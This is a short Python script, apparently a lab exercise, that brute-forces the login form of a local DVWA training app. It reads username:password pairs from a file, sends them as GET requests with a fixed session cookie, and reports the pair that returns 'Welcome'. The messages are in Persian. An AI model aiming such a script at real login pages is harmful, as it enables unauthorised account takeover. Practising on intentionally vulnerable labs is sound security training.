# import requests

# with open("passwordList.txt", "r") as file:
#     for line in file:
#         line = line.strip("\n")
#         data = line.split(":")
#         targetUrl = f"http://localhost/dvwa/vulnerabilities/brute/?username={data[0]}&password={data[1]}&Login=Login"
#         header = {"cookie":"PHPSESSID=16cskeqqnodcd9v9e9t7rsn30v; security=low; theme=dark"}
#         r = requests.get(url=targetUrl, headers=header)
#         if "Welcome" in r.text:
#             print("password detected!")
#             print(line)
#             break

import requests

url = "http://localhost/dvwa/vulnerabilities/brute/"
headers = {"cookie": "PHPSESSID=16cskeqqnodcd9v9e9t7rsn30v; security=low; theme=dark"}

with open("passwordList.txt", "r") as file:
    found = False
    for line in file:
        line = line.strip()
        user, pwd = line.split(":")
        
        # حالت GET
        targetUrl = f"{url}?username={user}&password={pwd}&Login=Login"
        try:
            r = requests.get(targetUrl, headers=headers, timeout=5)
        except Exception as e:
            print(f"❌ خطا در ارسال درخواست: {e}")
            break

        if "Welcome" in r.text:
            print("✅ رمز درست پیدا شد!")
            print(f"{user}:{pwd}")
            found = True
            break

    if not found:
        print("ℹ️ تمام لیست بررسی شد، هیچ رمز درستی پیدا نشد.")

